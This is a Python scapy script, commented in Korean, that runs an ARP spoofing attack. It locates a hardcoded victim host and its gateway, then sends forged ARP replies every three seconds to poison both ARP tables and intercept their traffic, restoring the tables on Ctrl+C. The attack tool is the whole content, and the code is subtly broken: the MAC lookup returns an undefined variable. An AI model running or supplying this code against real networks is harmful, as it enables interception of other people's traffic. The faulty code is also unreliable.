#게이트웨이의 ARP테이블 내
#	피해 컴퓨터 MAC 주소 -> 공격자 컴퓨터 MAC 주소
#피해 컴퓨터의 ARP테이블 내
#	게이트웨이 MAC 주소 -> 공격자 컴퓨터 MAC 주소
from scapy.all import *
from time import sleep

#이더넷환경의 LAN에서 IP에 해당하는 컴퓨터의 MAC 주소를 얻음
def getMAC(ip):
	ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3)
	for s, n in ans:
		return r.sprintf('%Ether.src%')

		
#srcip(공격자 MAC주소),  targetip(targetmac) 인 ARP패킷 생성 & Target IP에 ARP패킷 전송
def poisonARP(srcip, targetip, targetmac):
	arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
	send(arp)
	
	
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
	#피해 컴퓨터의 ARP 테이블 복구
	arp1 = ARP(op=2, pdst=victimip, psrc=gatewayip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
	#게이트웨이의 ARP 테이블을 복구
	arp2 = ARP(op=2, pdst=gatewayip, psrc=victimip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
	
	#ARP Reply인 ARP패킷을다른 호스트들이 받아도 자기들 ARP테이블을 수정하므로, 네트워크의 모든 호스트에게 브로드캐스트를 함
	#확실하게 복구위해 3번 전송
	send(arp1, count=3)
	send(arp2, count=3)
	
	
def main():
	gatewayip = '172.21.70.1'
	victimip = '172.21.70.180'
	
	victimmac = getMAC(victimip)
	gatewaymac = getMAC(gatewayip)
	
	if victimmac == None or gatewaymac == None:
		print('Could not find MAC Address')
		return
	
	print('+++ ARP Spoofing START -> VICTIM IP [%s]' %victimip)
	print('[%s] : POISON ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))
	
	try:
		#Ctrl+C로 프로그램 중지하기 전까지 3초마다 한 번씩 변조된 ARP Reply 패킷을피해 컴퓨터와 게이트웨이에 전송
		#해킹작업이 끝날 때까지 피해 컴퓨터와 게이트웨이의 ARP테이블을 변경된 상태로 지속하기 위함
		while True:
			#피해 컴퓨터의 ARP테이블 변경
			poisonARP(gatewayip, victimip, victimmac)
			#게이트웨이의 ARP테이블 변경
			poisonARP(victimip, gatewayip, gatewaymac)
			sleep(3)
	#Ctrl-C key input
	except KeyboardInterrupt:
		restoreARP(victimip, gatewayip, victimmac, gatewaymac)
		print('--- ARP Spoofing END -> RESTORED ARP Table')
		
	
if __name__ == '__main__':
	main()
